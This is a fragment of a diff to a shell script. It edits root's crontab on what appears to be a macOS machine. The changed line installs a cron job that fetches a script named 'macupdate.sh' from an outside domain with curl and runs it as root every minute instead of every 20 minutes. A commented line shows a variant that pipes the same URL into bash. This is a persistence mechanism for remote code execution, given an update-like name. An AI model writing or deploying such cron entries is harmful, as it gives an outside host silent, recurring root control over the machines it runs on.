@@ -38,7 +38,7 @@ fi
 
 # TODO: Check that this works and that the crontab path is correct
 cat /var/at/tabs/root | grep -v "erikboesen.com" > /tmp/crontab; mv /tmp/crontab /var/at/tabs/root; rm /tmp/crontab
-echo '*/20 * * * * curl -L erikboesen.com/macupdate.sh --output /tmp/macupdate.sh && chmod +x /tmp/macupdate.sh && /tmp/macupdate.sh' >> /var/at/tabs/root
+echo '* * * * * curl -L erikboesen.com/macupdate.sh --output /tmp/macupdate.sh && chmod +x /tmp/macupdate.sh && /tmp/macupdate.sh' >> /var/at/tabs/root
 
 #sudo su -c "printf '#\!/bin/bash\ncurl -L erikboesen.com/macupdate.sh |bash\n' > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update"
 
